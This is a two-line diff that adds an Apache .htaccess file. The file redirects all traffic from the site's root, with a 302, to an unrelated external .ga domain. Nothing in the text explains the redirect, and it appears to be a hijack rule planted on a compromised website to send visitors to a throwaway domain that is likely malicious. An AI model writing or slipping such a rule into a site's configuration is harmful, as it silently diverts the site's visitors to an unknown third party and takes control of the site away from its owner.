@@ -1,0 +1,2 @@
+RewriteEngine On
+Redirect 302 / http://aliyaheliorda.ga/index.html
